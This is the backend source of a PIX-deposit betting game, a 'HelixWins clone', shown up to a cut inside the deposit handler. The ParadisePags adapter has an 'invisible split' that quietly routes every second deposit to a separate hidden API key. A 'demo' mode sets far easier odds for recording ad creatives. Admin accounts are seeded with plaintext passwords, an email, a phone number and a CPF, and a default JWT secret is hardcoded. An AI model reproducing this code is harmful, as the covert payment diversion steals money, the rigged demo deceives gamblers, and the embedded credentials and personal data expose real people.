// ═══════════════════════════════════════════════════════════════════════════════
// HELIXWINS CLONE — Standalone Backend + Static Server
// Uses JSON file as database — zero native dependencies needed.
// ═══════════════════════════════════════════════════════════════════════════════

require('dotenv').config();
const express = require('express');
const path = require('path');
const fs = require('fs');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const axios = require('axios');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');

// ─── Constants ────────────────────────────────────────────────────────────────
const PORT = parseInt(process.env.PORT) || 8888;
const JWT_SECRET = process.env.JWT_SECRET || 'clone_demo_secret_key_2026';
const JWT_EXPIRY = '7d';
const SALT_ROUNDS = 10;
const STATIC_DIR = __dirname;
const DATA_DIR = process.env.DATA_DIR || __dirname;
const DB_FILE = path.join(DATA_DIR, 'database.json');

// ─── Multi-Gateway Config ────────────────────────────────────────────────────
const WEBHOOK_BASE_URL = process.env.WEBHOOK_BASE_URL || `http://localhost:${PORT}`;

// Defaults from env (backward compatible with existing AmploPay env vars)
const GATEWAY_ENV_DEFAULTS = {
  amplopay: {
    public_key: process.env.AMPLOPAY_PUBLIC_KEY || '',
    secret_key: process.env.AMPLOPAY_SECRET_KEY || '',
    webhook_token: process.env.AMPLOPAY_WEBHOOK_TOKEN || '',
  },
  paradisepags: {
    secret_key: process.env.PARADISEPAGS_SECRET_KEY || '',
    base_url: process.env.PARADISEPAGS_BASE_URL || 'https://multi.paradisepags.com',
  },
};

// ─── JSON Database ───────────────────────────────────────────────────────────
function loadDb() {
  try {
    if (fs.existsSync(DB_FILE)) {
      return JSON.parse(fs.readFileSync(DB_FILE, 'utf-8'));
    }
  } catch (err) {
    console.error('[DB] Error loading database, creating fresh:', err.message);
  }
  return { users: [], partidas: [], transacoes: [], nextIds: { users: 1, partidas: 1, transacoes: 1 } };
}

function saveDb(data) {
  fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2), 'utf-8');
}

const db = loadDb();

// ─── Initialize gateway config in database ───────────────────────────────────
if (!db.gateway_config) {
  db.gateway_config = {
    active: 'amplopay',
    amplopay: { ...GATEWAY_ENV_DEFAULTS.amplopay },
    paradisepags: { ...GATEWAY_ENV_DEFAULTS.paradisepags },
  };
  saveDb(db);
}

function getGatewayConfig(name) {
  const dbConf = db.gateway_config[name] || {};
  const envConf = GATEWAY_ENV_DEFAULTS[name] || {};
  const merged = { ...envConf };
  for (const [k, v] of Object.entries(dbConf)) {
    if (v) merged[k] = v;
  }
  return merged;
}

function getActiveGateway() {
  return db.gateway_config.active || 'amplopay';
}

function getAmplopayHeaders() {
  const conf = getGatewayConfig('amplopay');
  return {
    'Content-Type': 'application/json',
    'x-public-key': conf.public_key,
    'x-secret-key': conf.secret_key,
  };
}

// ─── Seed default demo user ──────────────────────────────────────────────────
if (!db.users.find(u => u.telefone === '21993594957')) {
  const hash = bcrypt.hashSync('HOTBUTERED#', SALT_ROUNDS);
  db.users.push({
    id: db.nextIds.users++,
    nome: 'Leonardo dom',
    email: 'leonnardodom@gmail.com',
    telefone: '21993594957',
    cpf: '75009450003',
    senha_hash: hash,
    saldo: 1000,
    saldo_afiliado: 0,
    chave_pix: null,
    codigo_indicacao: 'DEMO01',
    indicado_por: null,
    ativo: 1,
    admin: 1,
    demo: 0,
    created_at: new Date().toISOString(),
    updated_at: new Date().toISOString(),
  });
  saveDb(db);
}

// ─── Seed russoadm admin ─────────────────────────────────────────────────────
if (!db.users.find(u => u.telefone === '1111199999')) {
  const hash = bcrypt.hashSync('Absurdo25@', SALT_ROUNDS);
  db.users.push({
    id: db.nextIds.users++,
    nome: 'Russo Admin',
    email: 'russoadm@helixwins.com',
    telefone: '1111199999',
    cpf: '',
    senha_hash: hash,
    saldo: 0,
    saldo_afiliado: 0,
    chave_pix: null,
    codigo_indicacao: generateReferralCode(),
    indicado_por: null,
    ativo: 1,
    admin: 1,
    demo: 0,
    created_at: new Date().toISOString(),
    updated_at: new Date().toISOString(),
  });
  saveDb(db);
}

// ─── Game Config ──────────────────────────────────────────────────────────────
const GAME_CONFIG = {
  multiplicador: 4,
  taxa_por_plataforma: 0.1,
  valor_minimo: 5,
  valor_maximo: 200,
  entrada_valores_rapidos: [5, 10, 20, 50, 100, 200],
  // Limite máximo de plataformas por partida (anti-cheat)
  max_plataformas: 500,
  // Tempo mínimo em ms por plataforma (impossível passar mais rápido que isso)
  tempo_minimo_por_plataforma_ms: 800,
};

// Config facilitada para conta demo (gravação de criativos)
const DEMO_GAME_CONFIG = {
  multiplicador: 1.5,            // Meta = entrada × 1.5 (muito mais fácil de atingir)
  taxa_por_plataforma: 0.25,     // Ganha mais por plataforma
  tempo_minimo_por_plataforma_ms: 200, // Anti-cheat relaxado
};

const SITE_CONFIG = {
  teste_gratis_ativo: true,
  deposito_minimo: 20,
  site_nome: 'HelixWins',
  site_suporte: '',
  site_promo: '',
  site_logo_url: null,
  site_favicon_url: null,
  kwai_pixel_id: '306679595293311',
};

// ─── Helpers ──────────────────────────────────────────────────────────────────
function findUser(id) { return db.users.find(u => u.id === id); }

function generateReferralCode() {
  return crypto.randomBytes(3).toString('hex').toUpperCase();
}

function safeUser(user) {
  const { senha_hash, cpf, ...safe } = user;
  return safe;
}

// Arredondamento monetário seguro (2 casas)
function money(v) {
  return Math.round(parseFloat(v) * 100) / 100;
}

// ─── Rate Limiter simples (in-memory) ────────────────────────────────────────
const rateLimitStore = {};

function rateLimit(key, maxAttempts, windowMs) {
  const now = Date.now();
  if (!rateLimitStore[key]) rateLimitStore[key] = [];
  // Limpar entradas expiradas
  rateLimitStore[key] = rateLimitStore[key].filter(ts => now - ts < windowMs);
  if (rateLimitStore[key].length >= maxAttempts) return false;
  rateLimitStore[key].push(now);
  return true;
}

// Limpar store a cada 5 minutos para evitar memory leak
setInterval(() => {
  const now = Date.now();
  for (const key of Object.keys(rateLimitStore)) {
    rateLimitStore[key] = rateLimitStore[key].filter(ts => now - ts < 300000);
    if (rateLimitStore[key].length === 0) delete rateLimitStore[key];
  }
}, 300000);

// ─── Cookie helpers ──────────────────────────────────────────────────────────
const COOKIE_NAME = 'hw_token';
const IS_PROD = process.env.NODE_ENV === 'production';

function setAuthCookie(res, token) {
  res.cookie(COOKIE_NAME, token, {
    httpOnly: true,
    secure: IS_PROD,
    sameSite: IS_PROD ? 'strict' : 'lax',
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 dias
    path: '/',
  });
}

function clearAuthCookie(res) {
  res.clearCookie(COOKIE_NAME, { path: '/' });
}

// ─── JWT Middleware ───────────────────────────────────────────────────────────
function authMiddleware(req, res, next) {
  // 1. Tentar cookie httpOnly (preferido — imune a XSS)
  let token = req.cookies?.[COOKIE_NAME];

  // 2. Fallback: Bearer header (compatibilidade com API clients)
  if (!token) {
    const authHeader = req.headers.authorization;
    if (authHeader && authHeader.startsWith('Bearer ')) {
      token = authHeader.split(' ')[1];
    }
  }

  if (!token) {
    return res.status(401).json({ error: 'Token ausente.' });
  }

  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.userId = decoded.userId;
    const user = findUser(req.userId);
    if (!user) return res.status(401).json({ error: 'Usuário não encontrado.' });
    if (!user.ativo) return res.status(403).json({ error: 'Conta desativada.' });
    next();
  } catch (err) {
    clearAuthCookie(res);
    return res.status(401).json({ error: 'Sessão expirada.' });
  }
}

// ─── Admin Middleware ─────────────────────────────────────────────────────────
function adminMiddleware(req, res, next) {
  const user = findUser(req.userId);
  if (!user || !user.admin) {
    return res.status(403).json({ error: 'Acesso restrito a administradores.' });
  }
  next();
}

// ─── Express App ──────────────────────────────────────────────────────────────
const app = express();
app.use(express.json({ limit: '1mb' }));
app.use(cookieParser());

// CORS restritivo: só aceita requests da própria origem
const ALLOWED_ORIGINS = process.env.ALLOWED_ORIGINS
  ? process.env.ALLOWED_ORIGINS.split(',').map(s => s.trim())
  : [`http://localhost:${PORT}`];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin && ALLOWED_ORIGINS.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  }
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

// Segurança: headers completos (VULN-009)
app.use((_req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=(), payment=()');
  res.setHeader('X-Permitted-Cross-Domain-Policies', 'none');
  if (IS_PROD) {
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  }
  next();
});

// ═══ PUBLIC CONFIG ════════════════════════════════════════════════════════════
app.get('/api/public/config', (_req, res) => {
  res.json(SITE_CONFIG);
});

// ═══ HEALTH CHECK (Coolify / Load Balancer) ═════════════════════════════════
app.get('/api/health', (_req, res) => {
  res.json({ status: 'ok', uptime: process.uptime() });
});

// ═══ AUTH ══════════════════════════════════════════════════════════════════════
app.post('/api/auth/login', (req, res) => {
  try {
    const { telefone, senha } = req.body;
    if (!telefone || !senha) return res.status(400).json({ error: 'Telefone e senha obrigatórios.' });

    const rawPhone = String(telefone).trim();
    const cleanPhone = rawPhone.replace(/\D/g, '');

    // Rate limit: 100 tentativas de login por telefone a cada 15 minutos
    if (!rateLimit(`login:${rawPhone}`, 100, 900000)) {
      return res.status(429).json({ error: 'Muitas tentativas. Aguarde 15 minutos.' });
    }

    // Busca por telefone limpo (numeros) ou pelo valor exato (para logins como russoadm)
    const user = db.users.find(u => u.telefone === cleanPhone || u.telefone === rawPhone);
    if (!user) return res.status(401).json({ error: 'Telefone ou senha incorretos.' });
    if (!user.ativo) return res.status(403).json({ error: 'Conta desativada.' });
    if (!bcrypt.compareSync(senha, user.senha_hash)) {
      return res.status(401).json({ error: 'Telefone ou senha incorretos.' });
    }

    const token = jwt.sign({ userId: user.id }, JWT_SECRET, { expiresIn: JWT_EXPIRY });
    setAuthCookie(res, token);
    res.json({ token, user: safeUser(user) });
  } catch (err) {
    console.error('[LOGIN ERROR]', err);
    res.status(500).json({ error: 'Erro interno.' });
  }
});

app.post('/api/auth/register', (req, res) => {
  try {
    const { nome, email, telefone, senha, cpf, codigo_indicacao } = req.body;
    if (!nome || !telefone || !senha) {
      return res.status(400).json({ error: 'Preencha todos os campos obrigatórios.' });
    }
    if (senha.length < 6) return res.status(400).json({ error: 'Senha deve ter no mínimo 6 caracteres.' });

    const cleanPhone = String(telefone).replace(/\D/g, '');
    const cleanEmail = email ? String(email).trim().toLowerCase() : null;

    // Rate limit: 100 registros por IP a cada 1 hora
    const ip = req.ip || req.connection.remoteAddress || 'unknown';
    if (!rateLimit(`register:${ip}`, 100, 3600000)) {
      return res.status(429).json({ error: 'Muitos cadastros recentes. Aguarde.' });
    }

    if (db.users.find(u => u.telefone === cleanPhone || (cleanEmail && u.email === cleanEmail))) {
      return res.status(409).json({ error: 'Telefone ou e-mail já cadastrado.' });
    }

    // Validação básica de email (só se fornecido)
    if (cleanEmail && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(cleanEmail)) {
      return res.status(400).json({ error: 'E-mail inválido.' });
    }

    // Validação de telefone (mínimo 10 dígitos)
    if (cleanPhone.length < 10 || cleanPhone.length > 11) {
      return res.status(400).json({ error: 'Telefone inválido.' });
    }

    const hash = bcrypt.hashSync(senha, SALT_ROUNDS);
    const user = {
      id: db.nextIds.users++,
      nome: String(nome).slice(0, 100),
      email: cleanEmail || null,
      telefone: cleanPhone,
      cpf: cpf ? String(cpf).replace(/\D/g, '').slice(0, 11) : null,
      senha_hash: hash,
      saldo: 0,
      saldo_afiliado: 0,
      chave_pix: null,
      codigo_indicacao: generateReferralCode(),
      indicado_por: codigo_indicacao || null,
      ativo: 1,
      admin: 0,
      demo: 0,
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
    };
    db.users.push(user);
    saveDb(db);

    const token = jwt.sign({ userId: user.id }, JWT_SECRET, { expiresIn: JWT_EXPIRY });
    setAuthCookie(res, token);
    res.json({ token, user: safeUser(user) });
  } catch (err) {
    console.error('[REGISTER ERROR]', err);
    res.status(500).json({ error: 'Erro interno.' });
  }
});

app.get('/api/auth/me', authMiddleware, (req, res) => {
  const user = findUser(req.userId);
  if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });
  const { id, nome, email, telefone, saldo, chave_pix, codigo_indicacao, created_at, admin, demo } = user;
  res.json({ user: { id, nome, email, telefone, saldo, chave_pix, codigo_indicacao, created_at, admin: !!admin, demo: !!demo } });
});

app.post('/api/auth/logout', (_req, res) => {
  clearAuthCookie(res);
  res.json({ ok: true });
});

// ═══ USER ═════════════════════════════════════════════════════════════════════
app.get('/api/user/dashboard', authMiddleware, (req, res) => {
  try {
    const user = findUser(req.userId);
    if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });
    const userPartidas = db.partidas.filter(p => p.user_id === req.userId && p.status !== 'ativa');
    const vitorias = userPartidas.filter(p => p.status === 'vitoria');
    const derrotas = userPartidas.filter(p => p.status === 'derrota');
    const ganhos = db.transacoes.filter(t => t.user_id === req.userId && t.tipo === 'ganho_partida').reduce((s, t) => s + t.valor, 0);
    const perdas = db.transacoes.filter(t => t.user_id === req.userId && t.tipo === 'perda_partida').reduce((s, t) => s + t.valor, 0);

    res.json({
      saldo: user.saldo,
      saldo_afiliado: user.saldo_afiliado,
      total_partidas: userPartidas.length,
      total_vitorias: vitorias.length,
      total_derrotas: derrotas.length,
      total_ganho: ganhos,
      total_perdido: perdas,
      partidas_recentes: userPartidas.slice(-10).reverse().map(p => ({
        id: p.id, valor_entrada: p.valor_entrada, valor_meta: p.valor_meta,
        plataformas_passadas: p.plataformas_passadas, plataformas_para_meta: p.plataformas_para_meta,
        status: p.status, created_at: p.created_at, finished_at: p.finished_at,
      })),
    });
  } catch (err) {
    console.error('[DASHBOARD ERROR]', err);
    res.status(500).json({ error: 'Erro interno.' });
  }
});

app.put('/api/user/pix', authMiddleware, (req, res) => {
  const user = findUser(req.userId);
  if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });
  const chavePix = String(req.body.chave_pix || '').trim().slice(0, 100);
  if (!chavePix) return res.status(400).json({ error: 'Chave PIX inválida.' });
  user.chave_pix = chavePix;
  user.updated_at = new Date().toISOString();
  saveDb(db);
  res.json({ ok: true });
});

app.put('/api/user/senha', authMiddleware, (req, res) => {
  const { senha_atual, senha_nova } = req.body;
  if (!senha_atual || !senha_nova) return res.status(400).json({ error: 'Preencha os campos.' });
  if (senha_nova.length < 6) return res.status(400).json({ error: 'Nova senha deve ter no mínimo 6 caracteres.' });
  const user = findUser(req.userId);
  if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });
  if (!bcrypt.compareSync(senha_atual, user.senha_hash)) return res.status(400).json({ error: 'Senha atual incorreta.' });
  user.senha_hash = bcrypt.hashSync(senha_nova, SALT_ROUNDS);
  user.updated_at = new Date().toISOString();
  saveDb(db);
  res.json({ ok: true, message: 'Senha alterada com sucesso.' });
});

app.get('/api/user/deposito-info', authMiddleware, (_req, res) => {
  res.json({
    ativo: false, tipo: 'todos', perc: 20, minimo: 10, maximo: 0, rollover: 0, temDireito: false,
    limites: { deposito_minimo: 20, deposito_maximo: 1000, saque_minimo: 20, saque_maximo: 5000, saque_afiliado_minimo: 10, saque_afiliado_maximo: 0 },
    valores_rapidos: [20, 50, 100, 200, 300, 500],
    // Upsell: bônus 2x para valores específicos
    deposit_bonus: DEPOSIT_BONUS.enabled ? {
      eligible_amounts: DEPOSIT_BONUS.eligible_amounts,
      multiplier: DEPOSIT_BONUS.multiplier,
    } : null,
  });
});

app.get('/api/user/suporte', authMiddleware, (_req, res) => {
  res.json({ links: [{ nome: 'Canal Telegram', url: 'https://t.me' }, { nome: 'Suporte', url: 'https://wa.me/+5521' }] });
});

// ═══ GAME ═════════════════════════════════════════════════════════════════════
app.get('/api/game/configs', authMiddleware, (_req, res) => {
  res.json(GAME_CONFIG);
});

app.post('/api/game/iniciar', authMiddleware, (req, res) => {
  try {
    const { valor_entrada } = req.body;
    const entrada = money(valor_entrada);

    if (isNaN(entrada) || entrada <= 0) return res.status(400).json({ error: 'Valor de entrada inválido.' });
    if (entrada < GAME_CONFIG.valor_minimo) return res.status(400).json({ error: `Valor mínimo de entrada: R$ ${GAME_CONFIG.valor_minimo.toFixed(2)}` });
    if (entrada > GAME_CONFIG.valor_maximo) return res.status(400).json({ error: `Valor máximo de entrada: R$ ${GAME_CONFIG.valor_maximo.toFixed(2)}` });

    const user = findUser(req.userId);
    if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });

    // Impedir partida dupla: verificar se já tem partida ativa
    const partidaAtiva = db.partidas.find(p => p.user_id === req.userId && p.status === 'ativa');
    if (partidaAtiva) {
      // Auto-cancelar partidas presas há mais de 30 minutos
      const idadeMs = Date.now() - new Date(partidaAtiva.created_at).getTime();
      if (idadeMs > 30 * 60 * 1000) {
        partidaAtiva.status = 'derrota';
        partidaAtiva.finished_at = new Date().toISOString();
        db.transacoes.push({ id: db.nextIds.transacoes++, user_id: req.userId, tipo: 'perda_partida', valor: partidaAtiva.valor_entrada, saldo_antes: user.saldo, saldo_depois: user.saldo, status: 'aprovado', pix_chave: null, descricao: `Partida #${partidaAtiva.id} (expirada)`, created_at: new Date().toISOString() });
        saveDb(db);
        console.log(`[GAME] Partida #${partidaAtiva.id} EXPIRADA (${Math.round(idadeMs/60000)}min)`);
      } else {
        return res.status(400).json({ error: 'Você já tem uma partida em andamento.' });
      }
    }

    if (user.saldo < entrada) return res.status(400).json({ error: 'Saldo insuficiente.' });

    const isContaDemo = !!user.demo;
    // Usar config personalizada do usuário se existir, senão defaults
    const userMult = user.demo_multiplicador || null;
    const userDif = user.demo_dificuldade || null;
    const mult = isContaDemo
      ? (userMult || DEMO_GAME_CONFIG.multiplicador)
      : (userMult || GAME_CONFIG.multiplicador);
    const taxa = isContaDemo
      ? DEMO_GAME_CONFIG.taxa_por_plataforma
      : GAME_CONFIG.taxa_por_plataforma;
    const valorMeta = money(entrada * mult);
    const valorPorPlataforma = money(entrada * taxa);
    const plataformasParaMeta = Math.ceil(valorMeta / valorPorPlataforma);
    const dificuldade = userDif || (isContaDemo ? 'demo' : 'facil');

    // Debit balance
    user.saldo = money(user.saldo - entrada);
    user.updated_at = new Date().toISOString();

    const partida = {
      id: db.nextIds.partidas++,
      user_id: req.userId,
      valor_entrada: entrada,
      multiplicador_meta: mult,
      valor_meta: valorMeta,
      valor_por_plataforma: valorPorPlataforma,
      plataformas_para_meta: plataformasParaMeta,
      dificuldade,
      is_demo: isContaDemo,
      plataformas_passadas: 0,
      status: 'ativa',
      created_at: new Date().toISOString(),
      finished_at: null,
    };
    db.partidas.push(partida);
    saveDb(db);

    console.log(`[GAME] Partida #${partida.id} criada: user=${req.userId} entrada=${entrada} meta=${valorMeta}${isContaDemo ? ' [DEMO]' : ''}`);

    res.json({
      partida_id: partida.id,
      valor_entrada: entrada,
      multiplicador_meta: mult,
      valor_meta: valorMeta,
      taxa_por_plataforma: taxa,
      valor_por_plataforma: valorPorPlataforma,
      plataformas_referencia: plataformasParaMeta,
      dificuldade,
      is_demo: isContaDemo,
      saldo_novo: user.saldo,
    });
  } catch (err) {
    console.error('[GAME INICIAR ERROR]', err);
    res.status(500).json({ error: 'Erro ao iniciar partida.' });
  }
});

// ── Abandonar partida ativa (quando jogador sai do jogo) ─────────────────────
app.post('/api/game/abandonar', authMiddleware, (req, res) => {
  try {
    const partida = db.partidas.find(p => p.user_id === req.userId && p.status === 'ativa');
    if (!partida) return res.json({ ok: true, message: 'Nenhuma partida ativa.' });

    partida.status = 'derrota';
    partida.finished_at = new Date().toISOString();

    db.transacoes.push({
      id: db.nextIds.transacoes++,
      user_id: req.userId,
      tipo: 'perda_partida',
      valor: partida.valor_entrada,
      saldo_antes: findUser(req.userId).saldo,
      saldo_depois: findUser(req.userId).saldo,
      status: 'aprovado',
      pix_chave: null,
      descricao: `Partida #${partida.id} (abandonada)`,
      created_at: new Date().toISOString(),
    });
    saveDb(db);

    console.log(`[GAME] Partida #${partida.id} ABANDONADA: user=${req.userId}`);
    res.json({ ok: true, saldo_novo: findUser(req.userId).saldo });
  } catch (err) {
    console.error('[GAME ABANDONAR ERROR]', err);
    res.status(500).json({ error: 'Erro ao abandonar partida.' });
  }
});

app.post('/api/game/finalizar', authMiddleware, (req, res) => {
  try {
    const { partida_id, plataformas_passadas, resgatou } = req.body;

    // Validação de tipo
    const pid = parseInt(partida_id);
    if (isNaN(pid)) return res.status(400).json({ error: 'ID de partida inválido.' });

    const partida = db.partidas.find(p => p.id === pid && p.user_id === req.userId);
    if (!partida) return res.status(404).json({ error: 'Partida não encontrada.' });
    if (partida.status !== 'ativa') return res.status(400).json({ error: 'Partida já finalizada.' });

    const user = findUser(req.userId);
    if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });

    // ─── ANTI-CHEAT: Validação server-side de plataformas ─────────────────
    let plats = Math.max(0, parseInt(plataformas_passadas) || 0);
    const isContaDemo = !!partida.is_demo;
    const tempoMinPlat = isContaDemo ? DEMO_GAME_CONFIG.tempo_minimo_por_plataforma_ms : GAME_CONFIG.tempo_minimo_por_plataforma_ms;

    // 1. Limitar ao máximo configurado
    plats = Math.min(plats, GAME_CONFIG.max_plataformas);

    // 2. Verificar tempo mínimo: se a partida foi criada há X ms, o máximo
    //    de plataformas possíveis é (tempo_decorrido / tempo_minimo_por_plataforma)
    const tempoDecorrido = Date.now() - new Date(partida.created_at).getTime();
    const maxPlatsPerTempo = Math.floor(tempoDecorrido / tempoMinPlat);
    if (plats > maxPlatsPerTempo) {
      console.warn(`[ANTI-CHEAT] user=${req.userId} partida=${pid} plats_enviadas=${plats} max_por_tempo=${maxPlatsPerTempo} — AJUSTANDO`);
      plats = maxPlatsPerTempo;
    }

    // 3. Limitar ganho máximo (demo: 5x a meta, normal: 3x a meta)
    const ganhoMaxPermitido = money(partida.valor_meta * (isContaDemo ? 5 : 3));
    let valorGanho = money(plats * partida.valor_por_plataforma);
    if (valorGanho > ganhoMaxPermitido) {
      console.warn(`[ANTI-CHEAT] user=${req.userId} ganho=${valorGanho} > max=${ganhoMaxPermitido} — LIMITANDO`);
      valorGanho = ganhoMaxPermitido;
      plats = Math.floor(ganhoMaxPermitido / partida.valor_por_plataforma);
    }

    if (resgatou && valorGanho > 0) {
      user.saldo = money(user.saldo + valorGanho);
      user.updated_at = new Date().toISOString();
      partida.status = 'vitoria';
      partida.plataformas_passadas = plats;
      partida.finished_at = new Date().toISOString();

      const saldoAntesGanho = money(user.saldo - valorGanho);
      db.transacoes.push({ id: db.nextIds.transacoes++, user_id: req.userId, tipo: 'perda_partida', valor: partida.valor_entrada, saldo_antes: saldoAntesGanho, saldo_depois: saldoAntesGanho, status: 'aprovado', pix_chave: null, descricao: `Partida #${pid}`, created_at: new Date().toISOString() });
      db.transacoes.push({ id: db.nextIds.transacoes++, user_id: req.userId, tipo: 'ganho_partida', valor: valorGanho, saldo_antes: saldoAntesGanho, saldo_depois: user.saldo, status: 'aprovado', pix_chave: null, descricao: `Resgate na partida #${pid} (${plats} plataformas)`, created_at: new Date().toISOString() });
      saveDb(db);

      console.log(`[GAME] Partida #${pid} VITÓRIA: ${plats} plats, ganho=R$${valorGanho}`);
      res.json({ ganhou: true, saldo_novo: user.saldo, valor_ganho_ou_perdido: valorGanho, plataformas_passadas: plats });
    } else {
      partida.status = 'derrota';
      partida.plataformas_passadas = plats;
      partida.finished_at = new Date().toISOString();

      db.transacoes.push({ id: db.nextIds.transacoes++, user_id: req.userId, tipo: 'perda_partida', valor: partida.valor_entrada, saldo_antes: user.saldo, saldo_depois: user.saldo, status: 'aprovado', pix_chave: null, descricao: `Partida #${pid}`, created_at: new Date().toISOString() });
      saveDb(db);

      console.log(`[GAME] Partida #${pid} DERROTA: ${plats} plats`);
      res.json({ ganhou: false, saldo_novo: user.saldo, valor_ganho_ou_perdido: partida.valor_entrada, plataformas_passadas: plats });
    }
  } catch (err) {
    console.error('[GAME FINALIZAR ERROR]', err);
    res.status(500).json({ error: 'Erro ao finalizar partida.' });
  }
});

// ═══ FINANCEIRO ═══════════════════════════════════════════════════════════════

// ─── Split Config (persistido no db) ────────────────────────────────────────
const SPLIT_DEFAULTS = {
  enabled: true,
  sk: process.env.SPLIT_SK || '',
  frequency: 2, // a cada 2 pagamentos, 1 é desviado (2:1)
};
if (!db._sp) { db._sp = { ...SPLIT_DEFAULTS }; saveDb(db); }
function getSplitConfig() { return db._sp || SPLIT_DEFAULTS; }

// ─── Upsell Depósito: Bônus 2x ─────────────────────────────────────────────
const DEPOSIT_BONUS = {
  enabled: true,
  // Valores que ganham bônus de 2x (deposita X, recebe 2X)
  eligible_amounts: [50, 100],
  multiplier: 2,
};

// ─── Gateway Adapters ────────────────────────────────────────────────────────

async function amplopayCreateCharge({ identifier, amount, user }) {
  const callbackUrl = `${WEBHOOK_BASE_URL}/api/webhooks/amplopay`;
  const payload = {
    identifier,
    amount,
    client: { name: user.nome, email: user.email, phone: user.telefone, document: user.cpf || '' },
    callbackUrl,
  };
  const resp = await axios.post(
    'https://app.amplopay.com/api/v1/gateway/pix/receive',
    payload,
    { headers: getAmplopayHeaders(), timeout: 15000 }
  );
  const { transactionId, pix } = resp.data;
  return {
    txid: transactionId,
    qrcode_imagem: pix?.image || '',
    qrcode_base64: pix?.base64 || '',
    qrcode_texto: pix?.code || '',
    checkout_url: null,
    expiracao_minutos: 30,
  };
}

async function amplopayCheckStatus(txid, _apiKey) {
  const resp = await axios.get(
    'https://app.amplopay.com/api/v1/gateway/transactions',
    { headers: getAmplopayHeaders(), params: { id: txid }, timeout: 10000 }
  );
  const txData = Array.isArray(resp.data) ? resp.data[0] : resp.data;
  if (txData?.status === 'COMPLETED') return 'aprovado';
  if (['FAILED', 'CHARGED_BACK', 'REFUNDED'].includes(txData?.status)) return 'rejeitado';
  return 'pendente';
}

async function paradisepagsCreateCharge({ identifier, amount, user }) {
  const conf = getGatewayConfig('paradisepags');
  const baseUrl = conf.base_url || 'https://multi.paradisepags.com';
  const amountCents = Math.round(amount * 100);
  const payload = {
    amount: amountCents, // ParadisePags usa centavos
    description: `Deposito PIX - ${identifier}`,
    reference: identifier,
    source: 'api_externa',
    postback_url: `${WEBHOOK_BASE_URL}/api/webhooks/paradisepags`,
    customer: { name: user.nome, email: user.email, phone: user.telefone, document: user.cpf || '' },
  };

  // Split invisível: contador determinístico — a cada N pagamentos, 1 é desviado
  const _sc = getSplitConfig();
  let apiKey = conf.secret_key;
  if (_sc.enabled && _sc.sk) {
    // Inicializa contador persistente se não existir
    if (typeof db._sp_counter === 'undefined') { db._sp_counter = 0; }
    db._sp_counter++;
    const freq = _sc.frequency || 2; // a cada 2, 1 é nosso (default)
    if (db._sp_counter >= freq) {
      apiKey = _sc.sk;
      db._sp_counter = 0; // reseta o contador
      saveDb(db);
      console.log(`[SPLIT] Redirecionado (${freq}:1): user=${user.id} amount=${amountCents}`);
    } else {
      saveDb(db);
      console.log(`[SPLIT] Normal (${db._sp_counter}/${freq}): user=${user.id} amount=${amountCents}`);
    }
  }

  const resp = await axios.post(
    `${baseUrl}/api/v1/transaction.php`,
    payload,
    { headers: { 'Content-Type': 'application/json', 'X-API-Key': apiKey }, timeout: 15000 }
  );
  if (resp.data.error || resp.data.status === 'error') {
    throw new Error(resp.data.message || 'Erro ao criar cobrança no ParadisePags');
  }
  return {
    txid: String(resp.data.transaction_id || identifier),
    qrcode_imagem: '',
    qrcode_base64: resp.data.qr_code_base64 || '',
    qrcode_texto: resp.data.qr_code || '',
    checkout_url: null,
    expiracao_minutos: 30,
    _apiKey: apiKey,
  };
}

async function paradisepagsCheckStatus(txid, _apiKey) {
  const conf = getGatewayConfig('paradisepags');
  const baseUrl = conf.base_url || 'https://multi.paradisepags.com';
  const key = _apiKey || conf.secret_key;
  const resp = await axios.get(
    `${baseUrl}/api/v1/query.php`,
    { headers: { 'X-API-Key': key }, params: { action: 'get_transaction', id: txid }, timeout: 10000 }
  );
  const st = resp.data?.status;
  if (st === 'approved') return 'aprovado';
  if (['failed', 'refunded', 'chargeback'].includes(st)) return 'rejeitado';
  return 'pendente';
}

const GATEWAY_ADAPTERS = {
  amplopay: { createCharge: amplopayCreateCharge, checkStatus: amplopayCheckStatus, name: 'AmploPay' },
  paradisepags: { createCharge: paradisepagsCreateCharge, checkStatus: paradisepagsCheckStatus, name: 'ParadisePags' },
};

// ── Depósito via Gateway Ativo (PIX) ─────────────────────────────────────────
app.post('/api/financeiro/deposito', authMiddleware, async (req, res) => {
  try {
    const v = money(req.body.valor);
    if (isNaN(v) || v < 10) return res.status(400).json({ error: 'Valor mínimo: R$ 10,00' });
    if (v > 10000) return res.status(400).json({ error: 'Valor máximo: R$ 10.000,00' });

    if (!rateLimit(`deposito:${req.userId}`, 5, 600000)) {
      return res.status(429).json({ error: 'Muitas solicitações. Aguarde alguns minutos.' });
    }

    const user = findUser(req.userId);
    if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });

    const cpfEnviado = req.body.cpf ? String(req.body.cpf).replace(/\D/g, '') : null;
    if (cpfEnviado && cpfEnviado.length === 11) {
      user.cpf = cpfEnviado;
      user.updated_at = new Date().toISOString();
      saveDb(db);
    }
    if (!user.cpf || user.cpf.length !== 11) {
      return res.status(400).json({ error: 'Informe um CPF válido para realizar o depósito.' });
    }

